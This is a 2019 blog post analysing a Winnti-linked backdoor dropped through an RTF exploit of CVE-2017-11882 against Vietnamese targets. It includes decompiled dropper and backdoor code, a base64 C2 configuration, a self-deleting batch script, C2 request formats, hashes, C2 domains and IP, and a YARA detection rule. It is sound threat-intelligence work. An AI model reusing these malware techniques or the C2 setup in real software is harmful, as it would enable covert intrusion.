{
    "title": "medium_com",
    "text": "Winnti uses the rtf exploit 8.t too targeting\nVietnam\nThe stages of installation of the backoor\nSebdraven\nJul 23, 2019\n \n·\n \n6\n min read\nIn may 2019, I found a rtf\n152f95a5bdf549c5ca789d0dd99d635ee69cca6fe464ced5b39d0316707a4914 using\nthe same technics to drop 8.t on disk exploiting the cve-2017_11882, decodes many\n'les:\nC:\\Users\\admin\\AppData\\Local\\Temp\\LBTServ.dll\na8c21cb9dea1c9bc62adcc6de4a73c7971ea797ab4fdb93320532647625e22ba\nC:\\Users\\admin\\AppData\\Local\\Temp\\unio.exe\n7aadcb53ca413648eba86d01490038d4c0763bceb5875abceb10da12d4d6a2dd\nAnd a 'le very interesting:\nC:\\Users\\admin\\AppData\\Local\\Temp\\k1.ini\nthis 'le content is:\n[SYSTEM]\nCon'g=Z29vZzFldXBkYXRlLmNvbTo4MHx3d3cuZ29vZzFldXBkYXRlLmNvbTo4MHw6\nODB8\nPassWord=123456\nGroup=Default Group\nRemark=20180415\nVersion=1.0\nUID=21093024\nThis 'le is generated by the second EQNEDT32.exe after rewriting completly by the\nshellcode in memory and the UID change everyday.\nThe exe after dumping\n(3c027b14431e01c548326e68d5ab6c559867bbb62bb4651ad85c4867f26d8e64) the\nthe 'les in %TEMP% is made in the function FUN_00401040. (Function Called after the\nentry point)\nIn the 'rst step, the path of the 'les are created:\nGetTempPathW(0x104,&local_924);\nlstrcpyW(&local_618,&local_924); \nlstrcpyW(&local_410,&local_924);\nlstrcpyW(&local_208,&local_924);\nlstrcatW(&local_924,u_LBTServ.d_00409118); // LBTServ.dll\nlstrcatW(&local_924,(LPCWSTR)&DAT_00409110);\nlstrcatW(&local_618,u_mkrt.nww_004090fc);\nlstrcatW(&local_410,u_wbnsd.pr_004090e8);\nlstrcatW(&local_208,u_unio.e_00409134); // unio.exe\nlstrcatW(&local_208,(LPCWSTR)&DAT_0040912c);\nFUN_00401a80(0x6c,u_TYPELIB_004090d8);\nFUN_00401890(&local_618,&local_924); //install LBTServ.dll\nIn the function void __cdecl FUN_00401890(LPCWSTR param_1,LPCWSTR param_2)\nwe have\n: \nhFile = CreateFileW(param_1,0x80000000,0,\n(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);\nand here the content of the 'le is written in the same function:\nif (hObject != (HANDLE)0xNNNN) {\nhModule = LoadLibraryW(u_Kernel32.dll_004090bc);\nlocal_a = 0x69;i\nlocal_6 = 0x69;i\nlocal_c = ‘W’;\nlocal_b = 0x72; //r\nlocal_9 = 0x74;//t\nlocal_8 = 0x65;//e\nlocal_7 = 0x46;F\nlocal_5 = 0x6c;l\nlocal_4 = 0x65;e\nlocal_3 = 0;\npFVar2 = GetProcAddress(hModule,&local_c);\n(*pFVar2)(hObject,puVar1,(int)uVar7,&param_1,0);\nCloseHandle(hObject);\nFreeLibrary(hModule);\n}\nCloseHandle(hFile);\nIn the stack, &local_c =”WriteFile”The 'le wbnsd.pr compressing with ApLib is created in %TEMP%.\nAnd the function FUN_0040189 now, the 'le wbnsd.pr is read and decompressed in the\nfunction FUN_00401eb4, union.exe is located in 306AA8 and is written in the disk.\nIn 'naly, it’s the k1.ini 'le created in the %TEMP%.\nGetTempPathW(0x104,&WStack2864);\nlstrcatW(&WStack2864,u_k1.ini_004090ac);\nAnd the diNerent sections of the ini 'le are written using WritePrivatePro'leStringGhidra pseudo Code\nIn debug\nFinaly, unio.exe is executed.\nAfter the execution a .bat has created and executed:\nthe .bat deletes the EQNEDT32.EXE and itself.\ndel C:\\Program Files\\Common Files\\microsoft shared\\EQUATION\\EQNEDT32.EXE\ndel %0\nThe loading of the backdoor and the network protocolsThe loading of the backdoor and the network protocols\nThe backdoor LBTServ.dll is side loading by union.exe in the function FUN_00401000\n_strcpy(local_134,”LBTServ.dll”);\nlocal_c = LoadLibraryA(local_134);\nA mutex is too created:\nlocal_10 =\nCreateMutexA((LPSECURITY_ATTRIBUTES)0x0,0,”LBTWizRunningMutex”);\nThe malicious code of the backoor is in the export LGBT_Launch.\nThis function is called after an GetProcAddress.\npFVar3 = GetProcAddress(local_c,”LGBT_Launch”);\npvVar5 = (HANDLE)(*pFVar3)(local_14);\nThe function LGBT_Launch of the backdoor is:\nvoid __fastcall LGBT_Launch(DWORD param_1)\n{\nHANDLE hHandle;\nDWORD local_4;\n/* 0xc6f0 4 LGBT_Launch */\nlocal_4 = param_1;\ndo {\nhHandle = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,\n(LPTHREAD_START_ROUTINE)&LAB_1000c260,\n(LPVOID)0x0,0,&local_4);\nWaitForSingleObject(hHandle,0xNNNN);\nCloseHandle(hHandle);\nSleep(10000);\n} while( true );\n}\nA thread has created with the code on \n1000c260.the function 1000c260 is the function of initialization of the backoor.\nthe k1.ini 'le is readed to load the con'guration using by the backdoor.\nGetTempPathW(0x104,(LPWSTR)&uStack4);\nlstrcatW((LPWSTR)&uStack4,u_k1.i_1001b908);\nlstrcatW((LPWSTR)&uStack4,(LPCWSTR)&DAT_1001b900);\nGetPrivatePro'leStringW\n(u_SYSTEM_1001b8e0,u_Con'g_1001b914,(LPCWSTR)0x0,\n(LPWSTR)&stack0x000016bc,0x800,\n(LPCWSTR)&uStack4);\nthe 'rst string is\nZ29vZzFldXBkYXRlLmNvbTo4MHx3d3cuZ29vZzFldXBkYXRlLmNvbTo4MHw6ODB8\nand this string is a base64 encoding the c2. and this the function\nFUN_1000b730((int)&stack0x000016bc,uVar1,(int)puVar5,(int *)ppuVar6);\ndecoded the string.\nThe requests of this backdoor are very speci'cly.\nhxx://goog1eupdate.com/21093024/000003B800000EA8/2019/5/6/9/14/1/000E6\nDC900000029\nthe function which created this request is FUN_100053f0\nif (param_2 == 1) {\nuVar2 = deobf_hostname();\nDVar3 = GetTickCount();\nuVar8 = (uint)local_10.wSecond;\nuVar13 = (uint)local_10.wMinute;\nuVar12 = (uint)local_10.wHour;uVar7 = (uint)local_10.wMonth;\nuVar11 = (uint)local_10.wDay;\nuVar10 = (uint)local_10.wYear;\nDVar4 = GetCurrentThreadId();\nDVar5 = GetCurrentProcessId();\niVar6 = sprintf(_Dest,\n“%s %s%s/%s/%08X%08X/%u/%u/%u/%u/%u/%u/%08X%08x\nHTTP/1.0\\r\\nHost:%s\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows\nNT 5.1;SV1)\\r\\nAccept: */*\\r\\nProxy-Connection: Keep-Alive\\r\\nPragma:no-\ncache\\r\\n\\r\\n”\n,&DAT_1001b518,&DAT_1002d00c,&DAT_1002d00c,param_4,DVar5,DVar4,uVar10,\nuVar7,uVar11,uVar12,uVar13,uVar8,DVar3,uVar2,param_3);\nFUN_10002160(param_1,iVar6);\nreturn iVar6;\n}\nWe found the UID 21093024. And this UID changes every day.\nThe processID and the ThreadID are used to create the backoor.\nthis DAT_1001b518 is the method of HTTP\nThe backdoor is a state machine de'ned by the function FUN_10006b10Threat Intelligence\nFocus on the document\nThe document is a decoy written in Vietnamese and speak about a exchange of student\nfor the Unversity of Kazan.\nThe rtf document is already know for being used by the chinese threats actor.\nOn Vietnam, Goblin Panda is very active, a bit Icefog.\nBut the new is the backdoor is linked at Winnti group.\nThe domain used for the C2 goog1eupdate.com is not recorded an known group.\nThe protocol HTTPs is a strong TTP so it’s possible to make yara for the piece of code.\nrule backdoor_gob\n{\nmeta:\ngenerated_by = “Sebdraven”\nsample =\n“a8c21cb9dea1c9bc62adcc6de4a73c7971ea797ab4fdb93320532647625e22ba”\n/*\n0x549a 56 push esi\n0x549b E830020000 call 0x56d0\n0x54a0 50 push eax\n0x54a1 FF1598600110 call dword ptr [0x10016098]\n0x54a7 8B4C2424 mov ecx, dword ptr [esp + 0x24]\n0x54ab 8B542422 mov edx, dword ptr [esp + 0x22]\n0x54af 50 push eax\n0x54b0 8B442424 mov eax, dword ptr [esp + 0x24]\n0x54b4 81E1FFFF0000 and ecx, 0xNN\n0x54ba 81E2FFFF0000 and edx, 0xNN\n0x54c0 51 push ecx\n0x54c1 8B4C2426 mov ecx, dword ptr [esp + 0x26]0x54c5 25FFFF0000 and eax, 0xNN\n0x54ca 52 push edx\n0x54cb 8B542426 mov edx, dword ptr [esp + 0x26]\n0x54cf 50 push eax\n0x54d0 8B442428 mov eax, dword ptr [esp + 0x28]\n0x54d4 81E1FFFF0000 and ecx, 0xNN\n0x54da 81E2FFFF0000 and edx, 0xNN\n0x54e0 51 push ecx\n0x54e1 25FFFF0000 and eax, 0xNN\n0x54e6 52 push edx\n0x54e7 50 push eax\n0x54e8 FF1500610110 call dword ptr [0x10016100]\n0x54ee 50 push eax\n0x54ef FF1594600110 call dword ptr [0x10016094]\n0x54f5 50 push eax\n0x54f6 53 push ebx\n0x54f7 56 push esi\n0x54f8 6858B50110 push 0x1001b558\n0x54fd 6818B50110 push 0x1001b518\n0x5502 68C0740110 push 0x100174c0\n0x5507 57 push edi\n0x5508 FF1554610110 call dword ptr [0x10016154]\n0x550e 8B4C2468 mov ecx, dword ptr [esp + 0x68]\n0x5512 83C444 add esp, 0x44\n0x5515 8BF0 mov esi, eax\n0x5517 56 push esi\n0x5518 E843CCFFFF call 0x2160\n0x551d 8BC6 mov eax, esi\n0x551f 5F pop edi\n0x5520 5E pop esi\n0x5521 5D pop ebp\n0x5522 5B pop ebx\n0x5523 83C410 add esp, 0x10\n*/\nstrings:\n$chunk_1 = {\n56\nE8 ?? ?? ?? ??\n50\nFF 15 ?? ?? ?? ??\n8B 4C 24 ??\n8B 54 24 ??\n50\n8B 44 24 ??\n81 E1 FF FF 00 00\n81 E2 FF FF 00 00\n51\n8B 4C 24 ??\n25 FF FF 00 00\n528B 54 24 ??\n50\n8B 44 24 ??\n81 E1 FF FF 00 00\n81 E2 FF FF 00 00\n51\n25 FF FF 00 00\n52\n50\nFF 15 ?? ?? ?? ??\n50\nFF 15 ?? ?? ?? ??\n50\n53\n56\n68 ?? ?? ?? ??\n68 ?? ?? ?? ??\n68 ?? ?? ?? ??\n57\nFF 15 ?? ?? ?? ??\n8B 4C 24 ??\n83 C4 44\n8B F0\n56\nE8 ?? ?? ?? ??\n8B C6\n5F\n5E\n5D\n5B\n83 C4 10\n}\ncondition:\nany of them\n}\nAfter a retrohunt I found another backdoors\n399563e798edd4a9e1a89209b1b350a4e1197786c23c0986a1a965446e7d5474\n7206dbf8c80d220125234748725a911d766674292e437cb5599a619c77db5551\n5d4f46c4751573a3cbc63a6abed42068bf62416811b13bd7b6b7762151bd184d\nfd539d345821d9ac9b885811b1f642aa1817ba8501d47bc1de575f5bef2fbf9e\nAll are very similar with the backdoor.IOCs\n152f95a5bdf549c5ca789d0dd99d635ee69cca6fe464ced5b39d0316707a4914\nsha256 152f95a5bdf549c5ca789d0dd99d635ee69cca6fe464ced5b39d0316707a4914 \nsha1 17f0307a371aec346fe004f0ba599708453421cd \nmd5 9c13823a0ed273b292fd83ac56bea9b0 \nDropped executable 'le\nsha256 C:\\Users\\admin\\AppData\\Local\\Temp\\LBTServ.dll\na8c21cb9dea1c9bc62adcc6de4a73c7971ea797ab4fdb93320532647625e22ba \nsha256 C:\\Users\\admin\\AppData\\Local\\Temp\\unio.exe\n7aadcb53ca413648eba86d01490038d4c0763bceb5875abceb10da12d4d6a2dd\nDNS requests\ndomain goog1eupdate.com \ndomain \nwww.goog1eupdate.com\nConnections\nip 58.64.184.209\nMalware Analysis\nThreat\nIntelligence\n78 claps\nMore From Medium\nWRITTEN BY\nSebdraven\nOSINT, Python,Malware Analysis, Botnet Tracker, SIEM and\nIPS/IDS and Threats Expert / co-organizer #BotConf / co-\ncreator of #FastIR/ Researcher at @Epita\nFollow\nRelated reads\nCVE-2018\n–\n8414: A Case Study in Responsible Disclosure\nMatt Nelson\n \nin\n \nPosts By SpecterOps Team Members\nOct 23, 2018\n \n·\n \n12\n min read\n499\nRelated reads\nEver Increasing Importance Of Website Security In 2019 & Beyond\n\u0000LarsonReever\u0000\u0000\n \nin\n \nWP-Hacked-help\nApr 12, 2019\n \n·\n \n6\n min read\n67\nRelated reads\nWindows-Based Exploitation —VulnServer TRUN Command Buﬀer Overﬂow\nAndreas Poyiatzis\n \nin\n \nInfoSec Write-ups\nMay 30, 2019\n \n·\n \n6\n min read\n315\nAbout\nHelp\nLegal"
}